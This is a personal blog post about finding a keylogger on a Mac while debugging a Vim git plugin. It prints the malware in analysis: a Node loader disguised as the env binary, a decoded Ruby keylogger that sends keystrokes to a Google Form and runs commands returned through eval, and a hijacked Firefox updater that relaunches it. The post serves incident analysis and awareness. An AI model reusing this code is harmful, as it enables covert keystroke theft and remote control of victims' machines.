+++
title = "Vim As An Anti-Keylogger"
date = 2017-06-22
image.link = "/images/posts/vim-anti-keylogger/presentation.png"
+++

OK, this is a fictional title made just to sound cool, a more accurate title would be:

# How debugging a Vim plugin made me discover a keylogger

> Once upon a shell...

![Cat](/images/posts/vim-anti-keylogger/cat.gif)

Quick note about [fugitive](https://github.com/tpope/vim-fugitive). I'm using this Vim plugin *a lot*, it's one of the few I couldn't live without. I highly recommend it!

You can commit, show the status, add, revert, blame, directly from Vim It's a delight.

At one point, not sure when, the `:Gcommit` command stopped working. I even opened and later closed [an issue about it](https://github.com/tpope/vim-fugitive/issues/918).

# Debugging Gcommit

![Archeologist](/images/posts/vim-anti-keylogger/archeologist.gif)

To begin with, I had an in depth look at the [`Gcommit` source](https://github.com/tpope/vim-fugitive/blob/be2ff98db543990d7e59a90189733d7a779788fd/plugin/fugitive.vim#L1067-L1149), trying to figure out what was happening.

The extension is building a command that looks like this:

```shell
env GIT_EDITOR=false git commit 2> errorfile
```

Which in turn should fill the error file with:

```shell
error: There was a problem with the editor 'false'.
Please supply the message using either -m or -F option.
```

Then, if this messages is found (i.e. you have stuff to commit), read the content of the `.git/COMMIT_EDITMSG` file into the buffer and continue making your commit.

I discovered that my `env GIT_EDITOR=false git commit` command wasn't producing any errors, or anything at all. So here is a problem.

`env` is used to print the current environment variables, such as:


```shell
$ env
...
EDITOR=vim
HOME=/Users/victor
ITERM_PROFILE=Default
LANG=en_US.UTF-8
LC_ALL=en_US.UTF-8
LC_CTYPE=en_GB.UTF-8
PAGER=less
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/victor/.dot/.yada/bin
SHELL=/bin/zsh
TERM=screen-256color
TERM_PROGRAM=iTerm.app
USER=victor
...
```

In my case, it was not showing anything, why was that?

Turns out, the `env` in use was not `/usr/bin/env` but `/usr/local/bin/env`, which appeared fine, because it's where the `homebrew` packages are installed...

I looked at `/usr/local/bin/env`, the last modification date was approximately 1 week old.

## Here comes the node.

![Batman](/images/posts/vim-anti-keylogger/batman.gif)

Here's the content (truncated):

```javascript
##!/usr/local/bin/node
try{let c=require("child_process").spawn("ruby", ["-W0"],{detached:true,stdio:["pipe","ignore","ignore"]});c.unref();c.stdin.end("YHBncmVwIC1meCAicnVieSAtV[...]IGVuZA==", "base64");}catch(e){}
```

So I unwrapped the code and I started to feel that something was awfully wrong.

```javascript
##!/usr/local/bin/node
try{

  let c = require("child_process")
    .spawn(
      "ruby",
      ["-W0"],
      {
        detached: true,
        stdio: ["pipe","ignore","ignore"]
      }
  );

  c.unref();

  c.stdin.end("YHBncmVwIC1meCAicnVieSAtV...IGVuZA==", "base64");

} catch(e) {

}
```

Quick decomposition:

- `"ruby", ["-W0"]` spawns a silent ruby instance (hid any warning).
- `detached: true` makes the ruby instance run in the background even after the node script finishes.
- `stdio: ["pipe","ignore","ignore"]` only enables `stdin`.
- `c.unref();` makes ruby's parent (this node script) not wait for its return to continue, effectively making it permanent.
- `c.stdin.end("...", "base64");` sends the string with `base64` encoding to the ruby instance.

## Down the Ruby hole

Un-`base64`-ing the string to find the ruby payload running:

```ruby

`pgrep -fx "ruby -W0"`.empty ? || exit

require 'net/http'
require 'Base64'
require 'dl/import'

module Carbon
  extend DL::Importer
  dlload '/System/Library/Frameworks/Carbon.framework/Carbon'
  extern 'unsigned long CopyProcessName(const ProcessSerialNumber*,void*)'
  extern 'void GetFrontProcess(ProcessSerialNumber*)'
  extern 'void GetKeys(void*)'
  extern 'unsigned char CFStringGetCString(void*,void*,int,int)'
end

p = DL::CPtr.malloc(16)
n = DL::CPtr.malloc(16)
ns = DL::CPtr.malloc(80)
km = DL::CPtr.malloc(16)

pd = Hash.new(false)

pa = ''
pt = 0
ps = 0
s = ''

while true do
  Kernel.sleep(0.05)

  Carbon.GetKeys(km)
  Carbon.GetFrontProcess(p.ref)
  Carbon.CopyProcessName(p.ref, n.ref)

  a = Carbon.CFStringGetCString(n, ns, 80, 0x08000100) > 0 ? ns.to_s : '_'
  t = Time.now.to_i

  (0...128).each do |k |

    if (km.to_str[k >> 3].ord >> (k & 7)) & 1 > 0

      unless pd[k]
        pd[k] = true
        if a != pa
          s << "\n\n" + [t].pack("N") + a + "\n"
        else
          if t - pt > 6
            s << "\n\n" + [t].pack("N") + "\n"
          end
        end

        s << k.chr
        pt = t
        pa = a
      end

    else
      pd[k] = false
    end

  end

    if s.length > 2000 || (s.length > 20 && t - ps > 1200)
      begin
        Net::HTTP.start('docs.google.com', : use_ssl => true) { | connection |
          res = connection.post('/forms/d/e/***/formResponse', "entry.***=#{Base64.urlsafe_encode64(s)}")
          s = ''
          ps = t
          res.body.scan(/@@@(.*)@@@/) { | ms |
            ms.each do |m |
              c = Base64.urlsafe_decode64(m)
              Net::HTTP.start('docs.google.com', : use_ssl => true) { | connection2 |
                connection2.post('/forms/d/e/***/formResponse', "entry.***=#{Base64.urlsafe_encode64(eval(c))}")
              }
            end
          }
        }
      rescue SyntaxError
      rescue
    end
  end
end

```

Which is exactly the same code as [this metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb).

In a nutshell:

```shell
while true do
  GetKeys(keys)
  Process(keys)
  Send(keys)
end
```

![Freakout](/images/posts/vim-anti-keylogger/freakout.gif)

[Carbon](https://en.wikipedia.org/wiki/Carbon_(API)) is an API interacting with old Macintosh machines, in that case I think it's used to target a large number of machines without compatibility issues.

The keys were posted to a Google form, which doesn't give any information on its creator. Identifying the owner is apparently a common question, but the answer is always "you can, report the form if you want, but that's all". (if there's a way, please do let me know!)

After a few minutes looking at the form, it was removed by its creator. Which meant he detected that the payload stopped gathering information.

I also searched on my machine for the payload path to see if there was other compromised places (using [ripgrep](https://github.com/BurntSushi/ripgrep)):

```
$ sudo rg -F '/usr/local/bin/env'
```

One occurence of the string appeared in:

```
Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/MacOS/org.mozilla.updater
```

How weird!

This file had been compromised as well, the original `updater` had been renamed to `.org.mozilla.updater` and the new updater contained:

```
/usr/local/bin/env
/Applications/FirefoxDeveloperEdition.app/Contents/MacOS/updater.app/Contents/MacOS/.org.mozilla.updater "$@"
```

Meaning each time the updater is called, the keylogger is too. Nasty!

![ohno](/images/posts/vim-anti-keylogger/ohno.gif)

# OK! What now?

![Help](/images/posts/vim-anti-keylogger/help.gif)

I wasn't sure how to react to this gloomy discover, so I [asked internet about it](https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/), and there were some really good answers:

> First, use something like HandsOff or Little Snitch to monitor the applications on your system that opens outgoing connections.
([pilibitti](https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/))

> [...] if you want to do more forensics on your system, use the free tools provided by https://objective-see.com/
([pilibitti](https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib8ti2/))

> My solution would be to format the entire system.
([sorama2](https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dib78ve/))

And my favourite:

> "Take off and nuke the site from orbit. It's the only way to be sure".
([Chaoslab](https://www.reddit.com/r/hacking/comments/6el3tl/found_a_keylogger_on_my_machine_now_what/dibqesk/), reference to the [1986's Aliens movie](https://www.youtube.com/watch?v=aCbfMkh940Q))

Needless to say that the next day,  my debit card was cancelled, my computer wiped and reinstalled from scratch, and every single password in my password manager changed, along with the master password.

![Explosion](/images/posts/vim-anti-keylogger/explosion.gif)

# Lessons learned

- **Do** understand your tools.
- **Do** monitor what is going on.
- **Do** protect yourself.
- **Do not** click on stuff.
- **Do not** go on the internet.
- **Do not** use your computer.

![The End](/images/posts/vim-anti-keylogger/end.gif)

Presentation made during the [2017 June's Sectalk Meetup](https://www.meetup.com/SecTalks-London/events/239875896/): [See it here](/vim-keylogger-presentation)
